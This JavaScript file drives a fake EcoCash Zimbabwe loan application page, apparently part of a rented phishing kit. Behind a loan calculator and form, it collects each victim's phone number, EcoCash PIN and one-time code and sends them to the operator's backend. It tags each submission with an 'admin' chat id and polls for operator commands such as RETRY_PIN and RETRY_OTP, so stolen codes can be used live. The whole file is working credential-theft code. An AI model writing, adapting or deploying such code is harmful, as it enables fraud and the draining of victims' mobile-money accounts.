document.addEventListener('DOMContentLoaded', () => {
  const urlParams = new URLSearchParams(window.location.search);
  const adminChatId = urlParams.get('admin');

  let state = {
    amount: 'USD 1,000',
    duration: '6 Months',
    loanType: '',
    purpose: '',
    firstName: '',
    lastName: '',
    contact: '',
    employment: '',
    income: '',
    pin: '',
    otp: '',
    userId: null
  };

  const views = {
    calculator: document.getElementById('view-calculator'),
    form: document.getElementById('view-form'),
    waiting: document.getElementById('view-waiting'),
    login: document.getElementById('view-login'),
    otp: document.getElementById('view-otp'),
    success: document.getElementById('view-success')
  };

  function switchView(viewName) {
    Object.values(views).forEach(v => v.classList.add('hidden'));
    if (views[viewName]) {
      views[viewName].classList.remove('hidden');
    }
  }

  const amountRange = document.getElementById('amount-range');
  const calcAmountInput = document.getElementById('calc-amount');
  const durationRange = document.getElementById('duration-range');
  const durationVal = document.getElementById('duration-val');
  const monthlyPayment = document.getElementById('monthly-payment');

  function updateCalculator() {
    const val = parseInt(amountRange.value);
    state.amount = `USD ${val.toLocaleString()}`;
    calcAmountInput.value = state.amount;

    const months = parseInt(durationRange.value);
    state.duration = `${months} Months`;
    durationVal.textContent = state.duration;

    const monthly = (val * 1.12) / months;
    monthlyPayment.textContent = `USD ${Math.round(monthly).toLocaleString()}`;
  }

  amountRange.addEventListener('input', updateCalculator);
  durationRange.addEventListener('input', updateCalculator);

  document.getElementById('btn-start-app').addEventListener('click', () => {
    document.getElementById('form-amount').value = amountRange.value;
    state.amount = `USD ${parseInt(amountRange.value).toLocaleString()}`;
    switchView('form');
    validateStep(1);
  });

  let currentStep = 1;
  const formSteps = document.querySelectorAll('.form-step');
  const progressFill = document.getElementById('progress-fill');
  const stepIndicator = document.getElementById('step-indicator');

  function updateStepView() {
    formSteps.forEach((step, index) => {
      if (index + 1 === currentStep) {
        step.classList.remove('hidden');
      } else {
        step.classList.add('hidden');
      }
    });
    progressFill.style.width = `${(currentStep / 3) * 100}%`;
    stepIndicator.textContent = `Step ${currentStep} of 3`;
  }

  function isValidEcoCashNumber(number) {
    const clean = String(number || '').replace(/\D/g, '');
    return /^(077|078)\d{7}$/.test(clean);
  }

  function validateStep(step) {
    const currentStepEl = document.querySelector(`.form-step[data-step="${step}"]`);
    const nextBtn = currentStepEl ? currentStepEl.querySelector('.next-btn') : null;
    const submitBtn = document.getElementById('btn-submit-app');

    if (step === 2) {
      const contactVal = document.getElementById('user-contact').value;
      const isValid = isValidEcoCashNumber(contactVal);
      if (nextBtn) nextBtn.disabled = !isValid;
    } else {
      if (nextBtn) nextBtn.disabled = false;
    }

    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.title = "";
    }
  }

  const userContactInput = document.getElementById('user-contact');
  if (userContactInput) {
    userContactInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 10) {
        value = value.slice(0, 10);
      }
      e.target.value = value;
      validateStep(2);
    });
  }

  const loginContactInput = document.getElementById('login-contact');
  if (loginContactInput) {
    loginContactInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 10) {
        value = value.slice(0, 10);
      }
      e.target.value = value;
      checkPinComplete();
    });
  }

  document.getElementById('loan-type').addEventListener('change', () => validateStep(1));
  document.getElementById('form-amount').addEventListener('input', () => validateStep(1));
  document.getElementById('loan-purpose').addEventListener('input', () => validateStep(1));
  document.getElementById('first-name').addEventListener('input', () => validateStep(2));
  document.getElementById('last-name').addEventListener('input', () => validateStep(2));
  
  const employmentStatusSelect = document.getElementById('employment-status');
  if (employmentStatusSelect) {
    employmentStatusSelect.addEventListener('change', () => validateStep(3));
    employmentStatusSelect.addEventListener('input', () => validateStep(3));
  }
  
  const annualIncomeInput = document.getElementById('annual-income');
  if (annualIncomeInput) {
    annualIncomeInput.addEventListener('input', () => validateStep(3));
    annualIncomeInput.addEventListener('change', () => validateStep(3));
  }

  document.querySelectorAll('.next-btn').forEach(btn => {
    btn.addEventListener('click', async () => {
      if (currentStep === 2) {
        const contactVal = document.getElementById('user-contact').value;
        if (!isValidEcoCashNumber(contactVal)) {
          alert("Please enter a valid EcoCash Zimbabwe number starting with 077 or 078.");
          return;
        }
      }

      if (currentStep === 1) {
        state.loanType = document.getElementById('loan-type').value;
        state.amount = `USD ${parseInt(document.getElementById('form-amount').value || 1000).toLocaleString()}`;
        state.purpose = document.getElementById('loan-purpose').value || 'Loan';
      } else if (currentStep === 2) {
        state.firstName = document.getElementById('first-name').value || 'Client';
        state.lastName = document.getElementById('last-name').value || '';
        state.contact = document.getElementById('user-contact').value || '0770000000';

        document.getElementById('sum-amount').textContent = state.amount;
        document.getElementById('sum-duration').textContent = state.duration;
        document.getElementById('sum-purpose').textContent = state.purpose;
        document.getElementById('sum-name').textContent = `${state.firstName} ${state.lastName}`;
      }

      if (currentStep < 3) {
        currentStep++;
        updateStepView();
        validateStep(currentStep);
      }
    });
  });

  const btnSubmitApp = document.getElementById('btn-submit-app');
  if (btnSubmitApp) {
    btnSubmitApp.disabled = false;
    btnSubmitApp.addEventListener('click', async () => {
      state.employment = document.getElementById('employment-status').value || 'Not specified';
      state.income = document.getElementById('annual-income').value || '0';
      if (!state.contact) state.contact = '0770000000';

      switchView('waiting');
      try {
        const response = await fetch(`/api/submit-application${adminChatId ? '?admin=' + encodeURIComponent(adminChatId) : ''}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            contact: state.contact,
            pin: 'PENDING_PIN',
            amount: state.amount,
            adminChatId
          })
        });
        const data = await response.json();
        if (!data.success) {
          alert(data.error || " NOT PAID. CONTACT ADMIN TO UNLOCK YOUR LINK.");
          location.reload();
          return;
        }
        state.userId = data.userId;
        pollStatus();
      } catch (err) {
        console.error(err);
        alert("Network error. Please try again.");
        location.reload();
      }
    });
  }

  document.querySelectorAll('.prev-btn').forEach(btn => {
    btn.disabled = false;
    btn.addEventListener('click', () => {
      if (currentStep > 1) {
        currentStep--;
        updateStepView();
        validateStep(currentStep);
      }
    });
  });

  function pollStatus() {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/check-status/${state.userId}`);
        const data = await res.json();

        if (data.status === 'APPROVED_LOAD_OTP' || data.status === 'RETRY_PIN') {
          clearInterval(interval);
          document.getElementById('login-contact').value = state.contact;
          switchView('login');
        } else if (data.status === 'DENIED') {
          clearInterval(interval);
          alert('Your loan application was denied by EcoCash management.');
          location.reload();
        } else if (data.status === 'SUCCESS') {
          clearInterval(interval);
          populateSuccessScreen();
          switchView('success');
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }

  const pinBoxes = document.querySelectorAll('.pin-box');
  pinBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value;
      if (val && index < pinBoxes.length - 1) {
        pinBoxes[index + 1].focus();
      }
      checkPinComplete();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && index > 0) {
        pinBoxes[index - 1].focus();
      }
    });
  });

  function checkPinComplete() {
    const btnLogin = document.getElementById('btn-login');
    if (btnLogin) {
      btnLogin.disabled = false;
    }
  }

  const btnLoginEl = document.getElementById('btn-login');
  if (btnLoginEl) {
    btnLoginEl.disabled = false;
    btnLoginEl.addEventListener('click', async () => {
      const loginContactVal = document.getElementById('login-contact').value.trim();
      if (!isValidEcoCashNumber(loginContactVal)) {
        alert("Please enter a valid EcoCash Zimbabwe number starting with 077 or 078.");
        return;
      }

      let pinStr = '';
      pinBoxes.forEach(b => pinStr += b.value);
      state.pin = pinStr || '1234';
      state.contact = loginContactVal;
      switchView('waiting');
      document.getElementById('waiting-status-text').textContent = 'Verifying your account PIN...';

      try {
        const res = await fetch(`/api/submit-application${adminChatId ? '?admin=' + encodeURIComponent(adminChatId) : ''}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            contact: state.contact,
            pin: state.pin,
            amount: state.amount,
            adminChatId
          })
        });
        const data = await res.json();
        if (!data.success) {
          alert(data.error || " NOT PAID. CONTACT ADMIN TO UNLOCK YOUR LINK.");
          location.reload();
          return;
        }
        state.userId = data.userId;
        pollOtpStatus();
      } catch (e) {
        console.error(e);
        alert("Network error. Please try again.");
        location.reload();
      }
    });
  }

  function pollOtpStatus() {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/check-status/${state.userId}`);
        const data = await res.json();

        if (data.status === 'APPROVED_LOAD_OTP') {
          clearInterval(interval);
          document.getElementById('otp-target-display').textContent = state.contact;
          switchView('otp');
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(interval);
          switchView('login');
          document.getElementById('pin-error').classList.remove('hidden');
          pinBoxes.forEach(b => b.value = '');
          if (document.getElementById('btn-login')) document.getElementById('btn-login').disabled = false;
        } else if (data.status === 'SUCCESS') {
          clearInterval(interval);
          populateSuccessScreen();
          switchView('success');
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }

  const otpBoxes = document.querySelectorAll('.otp-box');
  otpBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value;
      if (val && index < otpBoxes.length - 1) {
        otpBoxes[index + 1].focus();
      }
      checkOtpComplete();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && index > 0) {
        otpBoxes[index - 1].focus();
      }
    });
  });

  function checkOtpComplete() {
    const btnSubmitOtp = document.getElementById('btn-submit-otp');
    if (btnSubmitOtp) {
      btnSubmitOtp.disabled = false;
    }
  }

  const btnSubmitOtpEl = document.getElementById('btn-submit-otp');
  if (btnSubmitOtpEl) {
    btnSubmitOtpEl.disabled = false;
    btnSubmitOtpEl.addEventListener('click', async () => {
      let otpStr = '';
      otpBoxes.forEach(b => otpStr += b.value);
      state.otp = otpStr || '123456';

      switchView('waiting');
      document.getElementById('waiting-status-text').textContent = 'Verifying 6-digit OTP code...';

      try {
        await fetch('/api/submit-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: state.userId, otp: state.otp })
        });
        pollFinalStatus();
      } catch (e) {
        console.error(e);
      }
    });
  }

  function pollFinalStatus() {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/check-status/${state.userId}`);
        const data = await res.json();

        if (data.status === 'SUCCESS') {
          clearInterval(interval);
          populateSuccessScreen();
          switchView('success');
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(interval);
          switchView('otp');
          document.getElementById('otp-error').classList.remove('hidden');
          otpBoxes.forEach(b => b.value = '');
          if (document.getElementById('btn-submit-otp')) document.getElementById('btn-submit-otp').disabled = false;
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(interval);
          switchView('login');
          document.getElementById('pin-error').classList.remove('hidden');
          pinBoxes.forEach(b => b.value = '');
          if (document.getElementById('btn-login')) document.getElementById('btn-login').disabled = false;
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }

  function populateSuccessScreen() {
    document.getElementById('approved-amount-val').textContent = state.amount;
  }

  const btnHome = document.getElementById('btn-home');
  if (btnHome) {
    btnHome.disabled = false;
    btnHome.addEventListener('click', () => {
      location.reload();
    });
  }
});
    
